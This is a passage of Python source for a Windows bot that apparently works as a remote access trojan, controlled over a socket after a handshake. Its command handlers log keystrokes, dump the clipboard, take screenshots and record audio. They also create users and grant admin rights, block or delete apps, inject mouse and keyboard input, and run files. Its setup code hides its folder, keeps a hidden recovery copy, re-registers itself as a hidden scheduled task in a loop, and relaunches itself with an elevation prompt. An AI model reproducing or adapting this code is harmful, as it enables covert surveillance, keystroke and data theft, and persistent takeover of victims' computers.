COMMAND: ''' + (command if command else NULL + '\n') + f'''LAST RUNTIME: {getattr(qtask, "LastRunTime", NULL)}
HIDDEN: {getattr(settings, "Hidden", NULL)}
ENABLED: {getattr(qtask, "Enabled", NULL)}
STATUS: {status}
''')
                    
                CoUninitialize()
                
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>system|users|user)\s*(?P<name>.*?)\s*-d\s*(?P<description>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-h\s*(?P<hidden>true|false)\s*-e\s*(?P<event>.+)', args):
                tuser, name, description, path, targs, hidden, event = exp['user'], exp['name'], exp['description'], exp['path'], exp['args'], exp['hidden'] == 'true', exp['event'].split(maxsplit=1)

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return

                ctask = create_task(tuser, name, description, path, targs, hidden, event)

                if ctask:
                    send(f'task is created for ({tuser}) user ({name}) [+]')  
                elif ctask is None:
                    send(f'failed to create task for ({tuser}) user ({name}) [-]')
                else:
                    match event[0]:
                        case 'idle':  
                            send('example event (idle 10 20) is valid [*]')
                        case 'time':  
                            send('example event (time 1991-02-20T00:00:00) is valid [*]')
                        case 'event':  
                            send('''example event (event <QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[EventID=4624]]
    </Select>
  </Query>
</QueryList>) is valid [*]''')
                        case _:
                            send(f'invalid value for task creation ({" ".join(event)}) [*]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return

                try:
                    scheduler().DeleteTask(name, 0)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to delete task ({name}) [-]')
                else:
                    send(f'task is deleted ({name}) [+]')

                CoUninitialize()

                return
            elif exp := parse_cmd(r'-m\s*(?P<mode>enable|disable)\s*(?P<name>.+)', args):
                name, mode = exp['name'], exp['mode']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return
                
                try:
                    qtask = scheduler().GetTask(name)
                    qtask.Enabled = mode == 'enable'
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to change task mode ({name}) [-]')
                else:
                    send(f'task mode is changed ({name}) --> ({mode}) [+]')

                CoUninitialize()

                return
            elif exp := parse_cmd(r'-l\s*(?P<name>.*?)\s*-a\s*(?P<args>.+)', args):
                name, targs = exp['name'], exp['args']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return

                try:
                    scheduler().GetTask(name).Run(exp['args'] if targs else None)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to start task ({name}) [-]')
                else:
                    send(f'task is started ({name}) [+]')

                CoUninitialize()

                return
            elif exp := parse_cmd(r'-s\s*(?P<name>.+)', args):
                name = exp['name']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return
                
                try:
                    scheduler().GetTask(name).Stop(0)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to stop task ({name}) [-]')
                else:
                    send(f'task is stopped ({name}) [+]')

                CoUninitialize()
                
                return
        case 'startup':
            if args == '-g':
                startup_str = startup()

                send(startup_str, doc='startup.txt') if startup_str else send('startup is empty [*]')
                return
            elif exp := parse_cmd(r'-q\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']

                startup_query_list = startup_query(name, machine)

                if startup_query_list is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                send(f'NAME: {startup_query_list[0]}\nCOMMAND: {startup_query_list[1]}\nSTATUS: {startup_query_list[2]}')
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>machine|user)\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                machine, name, path, sargs = exp['user'] == 'machine', exp['name'], exp['path'], exp['args']

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return
                
                try:
                    reg_set_value(
                        REG_KEY_STARTUP_MACHINE if machine else REG_KEY_STARTUP_USER, 
                        name, 
                        f'"{os.path.abspath(path)}" {sargs}' if sargs != 'none' else quote(os.path.abspath(path)), 
                        'sz'
                    )
                except:
                    send(f'failed to create ({name}) in startup [-]')
                else:
                    send(f'created ({name}) in startup [+]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']

                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                key = os.path.split(query[0])[0]
                
                try:
                    if key in {REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_USER}:
                        reg_delete(key, name, dir=False)
                    else:
                        os.remove(query[0])
                except:
                    send(f'failed to delete from startup ({name}) [-]')
                else:
                    send(f'deleted from startup ({name}) [+]')
                    
                return
            elif exp := parse_cmd(r'-m\s*(?P<user>machine|user)\s*(?P<mode>enable|disable)\s*(?P<name>.+)', args):
                machine, mode, name = exp['user'] == 'machine', exp['mode'], exp['name']

                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                try:
                    reg_set_value(
                        os.path.split(query[2])[0], 
                        name, 
                        REG_VALUE_STARTUP_ENABLED if mode == 'enable' else REG_VALUE_STARTUP_DISABLED, 
                        'binary'
                    )
                except:
                    send(f'failed to change mode ({name}) in startup [-]')
                else:
                    send(f'mode is changed ({name}) --> ({mode}) in startup [+]')

                return
            elif exp := parse_cmd(r'-l\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']

                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                command = query[1]

                if os.path.split(query[0])[0] in {REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_USER}:
                    send(f'started ({name}) in startup [+]' if (launch if os.path.exists(command) else shell)(command) else f'failed to start ({name}) in startup [-]')
                else:
                    send(f'started ({name}) in startup [+]' if launch(command) else f'failed to start ({name}) in startup [-]')
                    
                return
            elif exp := parse_cmd(r'-s\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']
                
                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                command = query[1]

                send(f'stopped ({name}) in startup [+]' if kill(os.path.split(command)[-1] if os.path.exists(command) else command) else f'failed to stop ({name}) in startup [-]')
                return
        case 'app':
            if args == '-g':
                with StringIO() as buf:
                    app_list = app()

                    if not app_list:
                        send(NULL)
                        return
                    
                    for n in app_list:
                        buf.write(f'NAME: {n[0]}\nVENDOR: {n[1]}\nVERSION: {n[2]}\nLANG: {n[3]}\nDATE: {n[4]}\n\n')
                    
                    send(buf.getvalue(), doc='app.txt') 
                    return
            elif exp := parse_cmd(r'-u\s*(?P<name>.+)', args):
                name = exp['name']

                send(f'app is deleted ({name}) [+]' if delete_app(name) else f'failed to delete app ({name}) [-]')
                return
            elif args == '-l':
                try:
                    blocked_apps = decrypt(read_file(FILE_APP_BLOCKER)).splitlines()
                except:
                    send('no blocked apps [*]')
                    return
                
                bapps = []
                
                for line in blocked_apps:
                    n = line.split('=')

                    if len(n) == 2:
                        bapps.append([n[0], n[1]])
                
                send(tabulate(bapps, headers=[('NAME'), ('DATE')], tablefmt='grid'), doc='blocked_apps.txt') if bapps else send('no blocked apps [*]')
                return
            elif exp := parse_cmd(r'-b\s*(?P<name>.+)', args):
                name, date = exp['name'], get_date()

                if not os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')

                send(f'app is blocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, f'{name}={date[0]} | {date[1]}', enc=True) else f'failed to block app ({name}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                send(f'app is unblocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, name, delete=True, enc=True) else f'app does not exist ({name}) [*]') if os.path.isfile(FILE_APP_BLOCKER) else send('no blocked apps [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')
                    send('apps is unblocked [+]')
                else:
                    send('no blocked apps [*]')

                return
        case 'env':
            if args == '-g':
                with StringIO() as buf:
                    for (key, value) in os.environ.items():
                        buf.write(f'{key}={value}\n')
                    
                    send(buf.getvalue(), doc='environment.txt')
                    return
            elif exp := parse_cmd(r'-q\s*(?P<key>.+)', args):
                key = exp['key']

                send(str(os.getenv(key, f'environment key does not exist ({key}) [*]')))
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>machine|user|tmp)\s*(?P<key>.*?)\s*-v\s*(?P<value>.*?)\s*-t\s*(?P<type>none|sz|expand_sz|binary|dword|dword_big_endian|qword)', args):
                tenv, key, value, value_type = exp['user'], exp['key'], exp['value'], exp['type']

                match tenv:
                    case 'machine':
                        reg_env = REG_KEY_ENV_MACHINE
                    case 'user':
                        reg_env = REG_KEY_ENV_USER
                    case 'tmp':
                        reg_env = REG_KEY_TMP_ENV_USER

                try:
                    reg_set_value(reg_env, key, value, value_type)
                except:
                    send(f'failed to create environment key ({key}) [-]')
                else:
                    send(f'environment key is created ({key}={value}) [+]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<user>machine|user|tmp)\s*(?P<key>.+)', args):
                tenv, key = exp['user'], exp['key']

                match tenv:
                    case 'machine':
                        reg_env = REG_KEY_ENV_MACHINE
                    case 'user':
                        reg_env = REG_KEY_ENV_USER
                    case 'tmp':
                        reg_env = REG_KEY_TMP_ENV_USER

                try:
                    reg_delete(reg_env, key, dir=False)
                except FileNotFoundError:
                    send(f'environment key does not exist ({key}) [*]')
                except:
                    send(f'failed to delete environment key ({key}) [-]')
                else:
                    send(f'environment key is deleted ({key}) [+]')

                return
        case 'lang':
            if args == '-g':
                clang = powershell('(Get-WinUserLanguageList).LanguageTag', output=True)

                send(clang if clang else NULL)
                return
            elif exp := parse_cmd(r'-i\s*(?P<lang>.+)', args):
                clang = exp['lang']

                send(f'language is installed ({clang}) [+]' if powershell(f'Install-Language -Language {quote(clang)}') else f'failed to install language ({clang}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<lang>.+)', args) :
                clang = exp['lang']

                clangl = powershell('(Get-WinUserLanguageList).LanguageTag', output=True)

                if (clangl is None) or (clang not in clangl):
                    send(f'language does not exist ({clang}) [*]')
                    return
                
                powershell('Get-WindowsPackage -Online | Where-Object { $_.PackageName -like \'*' + clang + '*\' } | ForEach-Object { Remove-WindowsPackage -Online -PackageName $_.PackageName }')
                send(f'language is deleted ({clang}) [+]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<lang>.+)', args):
                clang = exp['lang']

                clangl = powershell('(Get-WinUserLanguageList).LanguageTag', output=True)

                if (clangl is None) or (clang not in clangl):
                    send(f'language does not exist ({clang}) [*]')
                    return

                powershell(f'Set-WinSystemLocale {quote(clang)}')
                powershell(f'Set-WinUILanguageOverride -Language {quote(clang)}')
                send(f'language is set ({clang}) [+]')

                return
        case 'user':
            if args == '-g':
                with StringIO() as buf:
                    user_list = user('get', None)

                    if not user_list:
                        send(NULL)
                        return

                    for n in user_list:
                        buf.write(f'''SID: {n[0]}
FULL NAME: {n[1]}
NAME: {n[2]}
DESCRIPTION: {n[3]}
ADMIN: {n[4]}
LOGIN ATTEMPTS: {n[5]}
LOGGED IN: {n[6]}
STATUS: {"ENABLED" if n[7] else "DISABLED"}\n
''')

                    send(buf.getvalue(), doc='user.txt')
                    return
            elif exp := parse_cmd(r'-g\s*(?P<name>.+)', args):
                send(user('query_group', exp['name']))
                return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                n = user('query', name)

                send(f'''SID: {n[0]}
FULL NAME: {n[1]}
NAME: {n[2]}
DESCRIPTION: {n[3]}
ADMIN: {n[4]}
LOGIN ATTEMPTS: {n[5]}
LOGGED IN: {n[6]}
STATUS: {"ENABLED" if n[7] else "DISABLED"}\n
''') if n else send(NULL)
                return
            elif exp := parse_cmd(r'(?P<mode>-j|-uj)\s*(?P<name>.*?)\s*-g\s*(?P<group>.+)', args):
                send(user('ungroup' if exp['mode'] == '-uj' else 'group', exp['name'], group=exp['group']))
                return
            elif exp := parse_cmd(r'(?P<mode>-a|-ua)\s*(?P<name>.+)', args):
                send(user('admin' if exp['mode'] == '-a' else 'unadmin', exp['name']))
                return
            elif exp := parse_cmd(r'-p\s*(?P<name>.*?)\s*-o\s*(?P<old_password>.*?)\s*-n\s*(?P<new_password>.+)', args):
                old_password, new_password = exp['old_password'], exp['new_password']

                send(user(
                    'password', 
                    exp['name'], 
                    old_password='' if old_password == 'none' else old_password, 
                    password='' if new_password == 'none' else new_password
                ))
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<password>.*?)\s*-d\s*(?P<description>.+)', args):
                name, upassword, description = exp['name'], exp['password'], exp['description']

                send(user(
                    'create', 
                    name, 
                    password='' if upassword == 'none' else upassword, 
                    description='' if description == 'none' else description
                ))
                return
            elif exp := parse_cmd(r'-r\s*(?P<name>.+)', args):
                send(user('delete', exp['name']))
                return
            elif exp := parse_cmd(r'(?P<mode>-e|-d)\s*(?P<name>.+)', args):
                send(user('enable' if exp['mode'] == '-e' else 'disable', exp['name']))
                return
        case 'kill':
            send(f'killed ({args}) [+]' if kill(args) else f'failed to kill ({args}) [-]')
            return
        case 'run':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-w\s*(?P<window>true|false)', args):
                file_path, file_args, file_window = exp['path'], exp['args'], exp['window'] == 'true'

                start_file = launch(file_path, '' if file_args == 'none' else file_args, window=file_window)

                if start_file is None:
                    send(f'path does not exist ({file_path}) [*]')
                else:
                    send(f'ran file ({file_path}) [+]' if start_file else f'failed to run file ({file_path}) [-]')

                return
        case 'time':
            if args == '-g':
                send(get_date()[0])
                return
            elif exp := parse_cmd(r'-s\s*(?P<time>.+)', args):
                time_ = exp['time']

                send(f'time is changed ({time_}) [+]' if shell(f'time {time_}') else f'time is invalid ({time_}) [-]') 
                return
        case 'date':
            if args == '-g':
                send(get_date()[1])
                return
            elif exp := parse_cmd(r'-s\s*(?P<date>.+)', args):
                date = exp['date']

                send(f'date is changed ({date}) [+]' if shell(f'date {date}') else f'date is invalid ({date}) [-]')
                return            
        case 'mouse':
            if args == '-p':
                x, y = mouse.get_position()

                send(f'mouse position ({x}x{y})')
                return
            elif exp := parse_cmd(r'-d\s*(?P<display>true|false)', args):
                cshow = exp['display'] == 'true'

                win32api.ShowCursor(cshow)
                send('mouse is displayed [+]' if cshow else 'failed to display mouse [+]')
                return
            elif exp := parse_cmd(r'-t\s*(?P<trail>[0-7])', args):
                mtrail = exp['trail']

                reg_set_value(REG_KEY_MOUSE, 'MouseTrails', mtrail, 'sz')
                send(f'mouse trail is set ({mtrail}) [+]')
                return
            elif exp := parse_cmd(r'-c\s*arrow\s*(?P<arrow>.*?)\s*ibeam\s*(?P<ibeam>.*?)\s*hand\s*(?P<hand>.*?)\s*wait\s*(?P<wait>.+)', args):
                arrow, ibeam, hand, wait = exp['arrow'], exp['ibeam'], exp['hand'], exp['wait'] 

                if verify_cursor(arrow):
                    reg_set_value(REG_KEY_CURSOR, 'Arrow', quote(os.path.abspath(arrow)), 'sz')
                
                if verify_cursor(ibeam):
                    reg_set_value(REG_KEY_CURSOR, 'IBeam', quote(os.path.abspath(ibeam)), 'sz')
                
                if verify_cursor(hand):
                    reg_set_value(REG_KEY_CURSOR, 'Hand', quote(os.path.abspath(hand)), 'sz')

                if verify_cursor(wait):
                    reg_set_value(REG_KEY_CURSOR, 'Wait', quote(os.path.abspath(wait)), 'sz')
                
                send('mouse cursor is changed [+]')
                return
            elif exp := parse_cmd(r'-x\s*(?P<x>\d+)\s*-y\s*(?P<y>\d+)\s*-d\s*(?P<delay>\d+)', args):
                x, y, delay = int(exp['x']), int(exp['y']), int(exp['delay'])

                mouse.move(x, y, duration=delay)
                send(f'mouse is moved ({x}x{y}) [+]')
                return
            elif exp := parse_cmd(r'-f\s*(?P<sens>20|1[0-9]|[1-9])', args):
                msens = exp['sens']

                reg_set_value(REG_KEY_MOUSE, 'MouseSensitivity', msens, 'sz')
                send(f'mouse sensitivity is set ({msens}) [+]')
                return
            elif exp := parse_cmd(r'-v\s*(?P<speed>0|1|2)', args):
                mspeed = exp['speed']

                reg_set_value(REG_KEY_MOUSE, 'MouseSpeed', mspeed, 'sz')
                send(f'mouse speed is set ({mspeed}) [+]')
                return
            elif exp := parse_cmd(r'(?P<button>-l|-r|-m)\s*-c\s*(?P<click>\d+)\s*-d\s*(?P<delay>\d+)', args):
                click, delay, button = int(exp['click']), int(exp['delay']), exp['button']

                match button:
                    case '-l':
                        button = 'left'
                        mbutton = mouse.LEFT
                    case '-r':
                        button = 'right'
                        mbutton = mouse.RIGHT
                    case '-m':
                        button = 'middle'
                        mbutton = mouse.MIDDLE
                            
                for _ in range(click):
                    mouse.press(mbutton)
                    sleep(delay)
                    mouse.release(mbutton)

                send(f'mouse button ({button}) is clicked ({click}) [+]')
                return
            elif exp := parse_cmd(r'-b\s*(?P<swap>true|false)', args):
                mswap = exp['swap'] == 'true'

                reg_set_value(REG_KEY_MOUSE, 'SwapMouseButtons', '1' if mswap else '0', 'sz')
                send(f'mouse buttons is ' + ('swapped' if mswap else 'unswapped') + ' [+]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<amount>-*\d+)', args):
                amount = int(exp['amount'])

                mouse.wheel(amount)
                send(f'mouse is scrolled ({amount}) [+]')
                return
        case 'keyboard':
            if args == '-l':
                send(get_layout())
                return
            elif exp := parse_cmd(r'-s\s*(?P<layout>\w{2})', args):
                layout = exp['layout']

                for (c, l) in KEYBOARD_LAYOUT.items():
                    if layout == l:
                        try:
                            win32api.LoadKeyboardLayout(c, win32con.KLF_ACTIVATE)
                        except:
                            send(f'failed to set keyboard layout ({layout}) [-]')
                        else:
                            send(f'keyboard layout is set ({layout}) [+]')
                        
                        break
                else:
                    send(f'keyboard layout does not exist ({layout}) [*]')

                return
            elif exp := parse_cmd(r'-v\s*(?P<speed>3[0-1]|2[0-9]|1[0-9]|[1-9])', args):
                kspeed = exp['speed']

                reg_set_value(REG_KEY_KEYBOARD, 'KeyboardSpeed', kspeed, 'sz')
                send(f'keyboard speed is set ({kspeed}) [+]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<delay>[0-3])', args):
                kdelay = exp['delay']

                reg_set_value(REG_KEY_KEYBOARD, 'KeyboardDelay', kdelay, 'sz')
                send(f'keyboard delay is set ({kdelay}) [+]')
                return
            elif exp := parse_cmd(r'-t\s*(?P<text>.*?)\s*-d\s*(?P<delay>\d+)', args):
                text, delay = exp['text'], int(exp['delay'])

                kb.write(text, delay)
                send(f'keyboard wrote ({text}) [+]')
                return
            elif exp := parse_cmd(r'-k\s*(?P<key>.*?)\s*-p\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                key, amount, delay = exp['key'], int(exp['amount']), int(exp['delay'])

                for _ in range(amount):
                    try:
                        kb.press(key)
                        sleep(delay)
                        kb.release(key)
                    except:
                        send(f'keyboard key is invalid ({key}) [-]')
                        return

                send(f'keyboard key ({key}) is pressed ({amount}) [+]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<type>-k|-h)\s*(?P<key>.*?)\s*-n\s*(?P<new_key>.+)', args):
                key_type, key, new_key = exp['type'], exp['key'], exp['new_key']

                try:
                    (kb.remap_key if key_type == '-k' else kb.remap_hotkey)(key, new_key)
                except:
                    send('failed to remap keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) [-]')
                else:
                    send('remapped keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) --> ({new_key}) [+]')

                return
            elif exp := parse_cmd(r'-b\s*(?P<key>.+)', args):
                key = exp['key']

                try:
                    kb.block_key(key)
                except:
                    send(f'failed to block keyboard key ({key}) [-]')
                else:
                    send(f'keyboard key is blocked ({key}) [+]')

                return
            elif args == '-r':
                kb.unhook_all()
                send(f'keyboard keys is unblocked [+]')
                return  
        case 'clipboard':
            if args == '-g':
                clipboard_data = init_clipboard(win32clipboard.GetClipboardData)

                send(clipboard_data, doc='clipboard.txt') if clipboard_data else send('clipboard is empty [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<data>.+)', args):
                init_clipboard(win32clipboard.EmptyClipboard)       
                init_clipboard(win32clipboard.SetClipboardText, exp['data'])

                send('copied to clipboard [+]')
                return
            elif args == '-r':
                init_clipboard(win32clipboard.EmptyClipboard)

                send(f'clipboard is cleared [+]')
                return
        case 'screen':
            if args == '-e':
                try:
                    win32api.keybd_event(win32con.VK_ESCAPE, 0, win32con.KEYEVENTF_SCANCODE, 0) 
                    sleep(0.1)  
                    win32api.keybd_event(win32con.VK_ESCAPE, 0, win32con.KEYEVENTF_KEYUP, 0) 
                except:
                    send('failed to turned on screen [-]')
                else:
                    send('screen on [+]')

                return
            elif args == '-d':
                try:
                    win32api.SendMessage(0xFFFF, 0x112, 0xF170, 2)
                except:
                    send('failed to turned off screen [-]')
                else:
                    send('screen off [+]')

                return
            elif args == '-s':
                png = screenshot()

                send(_x00 if png is None else png)
                return
            elif exp := parse_cmd(r'-w\s*(?P<path>.+)', args):
                path = exp['path']

                if opencv.imread(path) is not None:
                    reg_set_value(REG_KEY_DESKTOP, 'WallPaper', quote(os.path.abspath(path)), 'sz')
                    send(f'wallpaper is changed ({path}) [+]')
                else:
                    send(f'wallpaper does not exist ({path}) [*]')

                return
        case 'audio':
            if args.isdigit():
                second = int(args)

                if second > 600:
                    send(f'maximum sound limit is 600 seconds [*]')
                    return
                
                send(f'audio start record ({second}s) [*]')
                wav = audio(second)
                client.recv(64)

                send(_x00 if wav is None else wav)
                return
            elif exp := parse_cmd(r'-p\s*(?P<path>.+)', args):
                audio_path = exp['path']

                if os.path.isfile(audio_path):
                    try:
                        playsound(audio_path, False)
                        send(f'audio is playing ({audio_path}) [*]')
                    except:
                        send(f'failed to play audio ({audio_path}) [-]')
                    else:
                        send(f'audio is played ({audio_path}) [+]')
                else:
                    send(f'audio does not exist ({audio_path}) [*]')

                return
        case 'share':
            if exp := parse_cmd(r'(?P<mode>-s|-w|-a)', args):
                share(exp['mode'], client, send)
                return
        case 'img':
            send(f'image is displayed ({args}) [+]' if display_img(args) else f'failed to display image ({args}) [-]') if os.path.isfile(args) else send(f'image does not exist ({args}) [*]')
            return
        case 'msg':
            if exp := parse_cmd(r'(?P<type>-p|-s|-i|-w|-e)\s*(?P<title>.*?)\s*-t\s*(?P<text>.+)', args):
                msg_type, title, text = exp['type'], exp['title'].replace('\\t', '\t').replace('\\n', '\n'), exp['text'].replace('\\t', '\t').replace('\\n', '\n')
                
                match msg_type:
                    case '-p':
                        Notification(title, '', text, duration='long').show()
                        send('msg push [+]')
                    case '-s':
                        win32api.MessageBox(0, text, title, win32con.MB_SYSTEMMODAL)
                        send('msg system [+]')
                    case '-i':
                        win32api.MessageBox(0, text, title, win32con.MB_ICONINFORMATION)
                        send('msg information [+]')
                    case '-w':
                        win32api.MessageBox(0, text, title, win32con.MB_ICONWARNING)
                        send('msg warning [+]')
                    case '-e':
                        win32api.MessageBox(0, text, title, win32con.MB_ICONERROR)
                        send('msg error [+]')

                return
        case 'keylogger':
            if exp := parse_cmd(r'-g\s*(?P<mode>base|char|hotkey|no hotkey)', args):
                if os.path.isfile(FILE_KEYLOGGER):
                    try:
                        data = keylogger_parser(exp['mode'])

                        send(data, doc='keylogger.txt') if data else send('keylogger data is empty [*]')
                    except:
                        send('failed to get keylogger data [-]')
                else:
                    send('keylogger is disabled [*]')
                
                return

            match args:
                case '-e':
                    write_file(FILE_KEYLOGGER_FLAG, '1')
                    send('keylogger is enabled [+]')
                    return
                case '-d':
                    write_file(FILE_KEYLOGGER_FLAG, '0')
                    send('keylogger is disabled [+]')
                    return
                case '-s':
                    send('keylogger is enabled [+]' if os.path.isfile(FILE_KEYLOGGER_FLAG) and (read_file(FILE_KEYLOGGER_FLAG) == '1') else 'keylogger is disabled [-]')
                    return   
                case '-r':
                    if os.path.isfile(FILE_KEYLOGGER):
                        write_file(FILE_KEYLOGGER, '')
                        send('keylogger data is reset [+]')
                    else:
                        send('keylogger is disabled [*]')

                    return
             
    send(f'command not found ({cmd})')


def get_admin():
    if windll.shell32.IsUserAnAdmin() != 0:
        return
    
    try:
        win32api.ShellExecute(
            None, 
            'runas', 
            *((__file__, None) if IS_EXE else (py_path, __file__)), 
            None, 
            1
        )
    except: 
        raise PermissionError('Administrator rights are required to execute')
    else:
        os._exit(0)


def setup():
    mkdir(PATH)
    hide(PATH)
    
    if not BOT_EXE:
        mkdir([
            PATH_MEM,
            PATH_SYS, 
            PATH_CONFIG,
            PATH_TMP,
            PATH_SHARE
        ])
        return
    
    if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_NAME):
        shutil.move(BOT_FILE_NAME, BOT_FILE_PATH)
    
    while True:
        mkdir([
            PATH,
            PATH_MEM,
            PATH_SYS, 
            PATH_CONFIG,
            PATH_TMP,
            PATH_SHARE
        ])

        hide(PATH)

        if not os.path.isfile(BOT_FILE_PATH_RECOVERY) and os.path.isfile(BOT_FILE_PATH):
            shutil.copy(BOT_FILE_PATH, BOT_FILE_PATH_RECOVERY)
            hide(BOT_FILE_PATH_RECOVERY)
        
        if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_PATH_RECOVERY):
            shutil.copy(BOT_FILE_PATH_RECOVERY, BOT_FILE_PATH)
        
        create_task(
            'users',
            name=BOT_TASK_NAME,
            description=BOT_TASK_DESCRIPTION,
            path=BOT_FILE_PATH,
            targs='none',
            hidden='true',
            event=['time'],
            bot_task=True
        )

        sleep(3)


def init():
    invalid_type('PORT', PORT, int)
    invalid_type('SEED', SEED, int)
    invalid_type('PATH', PATH, str)
    invalid_type('BOT_TASK_NAME', BOT_TASK_NAME, str)
    invalid_type('BOT_TASK_DESCRIPTION', BOT_TASK_DESCRIPTION, str)
    
    if PORT < 1:
        raise ValueError('(PORT) is invalid')
    
    try:
        decrypt(encrypt(' \t\n\u200B\u200F\u20600123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZабвгдеёжзийклмнопрстуфхцчшщыэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЫЭЮЯЄєЇїІіҐґ'))
    except:
        raise ValueError('(SEED) is invalid')
    
    if not os.path.isdir(os.path.split(PATH)[0]):
        raise ValueError('(PATH) is invalid')
    
    if BOT_EXE and not BOT_TASK_NAME:
        raise ValueError('(BOT_TASK_NAME) is empty')
    
    if BOT_EXE and not BOT_TASK_DESCRIPTION:
        raise ValueError('(BOT_TASK_DESCRIPTION) is empty')
    
    get_admin()

    Thread(target=setup, daemon=False).start()
    Thread(target=autostart, daemon=False).start()
    Thread(target=app_blocker, daemon=False).start()
    Thread(target=keylogger, daemon=False).start()


def get_ip():
    try:
        with socket(AF_INET, SOCK_DGRAM) as sock:
            sock.settimeout(1)
            sock.connect(('203.0.113.42', 4242))

            return sock.getsockname()[0]
    except:
        raise ValueError('ip is empty')


def handle_client(client, addr, ip):
    try:
        with client:
            flag = client.recv(64)

            if flag == b'0x1155cea24bacb916':
                client.sendall(str(SEED).encode())
            elif flag == b'0x7294cc821afdc797':
                client.sendall(b'0x7b833a928d167ab6')
                bot(client, ip)
    except:
        return


def server():
    ip = get_ip()

    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        sock.bind((ip, PORT))
        sock.listen()

        while True: 
            client, addr = sock.accept()

            client.settimeout(TIMEOUT)

            Thread(
                target=handle_client, 
                args=(client, addr, ip), 
                daemon=True
            ).start()
       
                               
def bot(client, sip):
    session_date = get_date()
    session = f'''
GitHub: https://github.com/cppandpython
AUTHOR: Vladislav Khudash
VERSION: win32

HOST: {NODE}\\\\{USER}
PLATFORM: {OS["platform"]} {OS["release"]} {OS["edition"]} 
DATE: {session_date[0]} | {session_date[1]}
'''


    def send(sock, data, doc=''):
        if isinstance(data, str):
            data = encrypt(data).encode() 

        ptr_data = data if isinstance(data, memoryview) else memoryview(data)
        buf = bytearray()
        chunk_size = 262_144
        compressor = compressobj(wbits=-15, level=9, memLevel=9)

        del data

        for n in range(0, len(ptr_data), chunk_size):
            buf.extend(compressor.compress(ptr_data[n:n + chunk_size]))

            if buf:
                sock.sendall(len(buf).to_bytes(4, 'big'))
                sock.recv(1)            
                sock.sendall(buf)
                buf.clear()

        buf.extend(compressor.flush())

        if buf:
            sock.sendall(len(buf).to_bytes(4, 'big'))
            sock.recv(1)
            sock.sendall(buf)
            buf.clear()

        sock.sendall(_x00)
        sock.recv(1)


    def recv_all(sock, size):
        buf = bytearray(size)  
        ptr = memoryview(buf)
        received = 0           

        while received < size:
            chunk = sock.recv(size - received)
            len_chunk = len(chunk)

            if not len_chunk:
                raise ConnectionError
            
            ptr[received:received + len_chunk] = chunk
            received += len_chunk

        return ptr


    def recv_bytes(sock):
        buf = bytearray()  
        decompressor = decompressobj(wbits=-15)

        while True:
            len_data = int.from_bytes(recv_all(sock, 4), 'big')

            if not len_data: 
                sock.sendall(b'\x00')
                break

            sock.sendall(b'\x01')  

